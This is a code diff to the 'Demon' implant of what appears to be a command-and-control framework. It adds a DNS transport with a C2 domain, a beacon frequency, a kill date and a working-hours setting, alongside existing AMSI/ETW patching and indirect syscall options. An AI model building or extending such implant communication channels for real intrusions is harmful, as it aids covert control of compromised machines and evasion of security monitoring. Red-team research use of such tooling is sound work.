@@ -282,6 +282,9 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
 #ifdef TRANSPORT_HTTP
             RtWinHttp,
 #endif
+#ifdef TRANSPORT_DNS
+            RtDnsapi,
+#endif
     };
 
     Instance->Teb = NtCurrentTeb();
@@ -292,6 +295,10 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
 
 #ifdef TRANSPORT_SMB
     PUTS( "TRANSPORT_SMB" )
+#endif
+
+#ifdef TRANSPORT_DNS
+    PUTS( "TRANSPORT_DNS" )
 #endif
 
 
@@ -620,7 +627,9 @@ VOID DemonConfig()
     Instance->Config.Implant.ProxyLoading       = ParserGetInt32( &Parser );
     Instance->Config.Implant.SysIndirect        = ParserGetInt32( &Parser );
     Instance->Config.Implant.AmsiEtwPatch       = ParserGetInt32( &Parser );
-#ifdef TRANSPORT_HTTP
+#ifdef TRANSPORT_DNS
+    Instance->Config.Implant.DownloadChunkSize  = 0x8000; /* 32k, DNS messages are chunked */
+#elif defined(TRANSPORT_HTTP)
     Instance->Config.Implant.DownloadChunkSize  = 0x80000; /* 512k */
 #else
     Instance->Config.Implant.DownloadChunkSize  = 0xfc00; /* 63k, needs to be less than PIPE_BUFFER_MAX */
@@ -770,6 +779,29 @@ VOID DemonConfig()
     MemCopy( Instance->Config.Transport.Name, Buffer, Length );
 
     PRINTF( "[CONFIG] PipeName: %ls\n", Instance->Config.Transport.Name );
+
+    Instance->Config.Transport.KillDate = ParserGetInt64( &Parser );
+    PRINTF( "KillDate: %d\n", Instance->Config.Transport.KillDate )
+    // check if the kill date has already passed
+    if ( Instance->Config.Transport.KillDate && GetSystemFileTime() >= Instance->Config.Transport.KillDate )
+    {
+        // refuse to run
+        // TODO: exit process?
+        Instance->Win32.RtlExitUserThread(0);
+    }
+    Instance->Config.Transport.WorkingHours = ParserGetInt32( &Parser );
+#endif
+
+#ifdef TRANSPORT_DNS
+
+    Buffer = ParserGetBytes( &Parser, &Length );
+    Instance->Config.Transport.Domain = Instance->Win32.LocalAlloc( LPTR, Length + sizeof( WCHAR ) );
+    MemCopy( Instance->Config.Transport.Domain, Buffer, Length );
+
+    PRINTF( "[CONFIG] Domain: %ls\n", Instance->Config.Transport.Domain );
+
+    Instance->Config.Transport.Frequency = ParserGetInt32( &Parser );
+    PRINTF( "[CONFIG] Frequency: %d seconds\n", Instance->Config.Transport.Frequency );
 
     Instance->Config.Transport.KillDate = ParserGetInt64( &Parser );
     PRINTF( "KillDate: %d\n", Instance->Config.Transport.KillDate )
